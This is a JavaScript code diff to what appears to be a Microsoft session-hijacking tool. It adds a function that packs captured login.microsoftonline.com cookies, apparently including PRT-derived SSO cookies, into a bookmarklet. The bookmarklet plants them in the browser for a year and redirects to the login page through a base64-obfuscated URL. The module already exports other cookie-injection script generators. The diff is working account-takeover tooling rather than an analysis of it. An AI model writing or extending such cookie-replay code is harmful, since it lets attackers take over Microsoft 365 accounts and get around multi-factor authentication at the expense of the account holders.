@@ -971,6 +971,9 @@ function generateExtensionData(cookieResult) {
     }))
     .filter(c => c.name && c.value);
   
+  // Generate bookmarklet script (document.cookie format)
+  const bookmarklet = generateBookmarkletScript(extensionCookies);
+
   return {
     success: true,
     cookies: extensionCookies,
@@ -981,7 +984,57 @@ function generateExtensionData(cookieResult) {
     fresh: cookieResult.fresh,
     generated_at: new Date().toISOString(),
     expires_in_seconds: cookieResult.expiration ? (cookieResult.expiration - Math.floor(Date.now() / 1000)) : undefined,
+    bookmarklet: bookmarklet,
   };
+}
+
+/**
+ * Generate a bookmarklet-style injection script using document.cookie.
+ *
+ * This format is designed to be run from the browser's address bar (as a
+ * bookmarklet) or devtools console while on login.microsoftonline.com.
+ *
+ * Key differences from the chrome.cookies.set() extension approach:
+ * - Uses document.cookie (works without extension permissions)
+ * - Uses domain=.login.microsoftonline.com (NOT .microsoftonline.com)
+ *   because document.cookie CANNOT set parent-domain cookies
+ * - Uses Max-Age=31536000 (1 year) for persistent cookies
+ * - Does NOT set httpOnly (document.cookie can't do that, but it's
+ *   not needed for SSO — the browser still sends the cookie)
+ * - Redirects to login.microsoftonline.com after setting cookies
+ *
+ * LIMITATION: Must be run while on login.microsoftonline.com (or a subdomain).
+ * The browser rejects document.cookie with a domain that doesn't match the
+ * current page.
+ *
+ * @param {array} cookies - Array of cookie objects from formatCookiesForInjection
+ * @returns {string} JavaScript bookmarklet code
+ */
+function generateBookmarkletScript(cookies) {
+  if (!cookies || !cookies.length) return '';
+
+  // Build cookie objects with the correct domain for document.cookie
+  const cookieObjects = cookies.map(c => ({
+    name: c.name,
+    value: c.value,
+    // Use .login.microsoftonline.com (NOT .microsoftonline.com) because
+    // document.cookie can't set parent-domain cookies. The current page
+    // must be on login.microsoftonline.com for this to work.
+    domain: c.domain && c.domain.includes('login.microsoftonline.com')
+      ? c.domain
+      : '.login.microsoftonline.com',
+    path: c.path || '/',
+    secure: c.secure !== false,
+    sameSite: c.sameSite || 'None',
+  }));
+
+  const cookiesJson = JSON.stringify(cookieObjects);
+
+  // Generate the bookmarklet script
+  // atob('aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29t') = https://login.microsoftonline.com
+  return `!function(){let e=JSON.parse(\`${cookiesJson}\`);
+for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`domain=\${o.domain};\`:""}Secure;SameSite=\${o.sameSite||'None'}\`;
+window.location.href=atob('aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29t')}();`;
 }
 
 module.exports = {
@@ -998,5 +1051,6 @@ module.exports = {
   generatePrtCookieInjectionScript,
   generateFullInjectionScript,
   formatCookiesForInjection,
-  generateExtensionData
+  generateExtensionData,
+  generateBookmarkletScript
 };
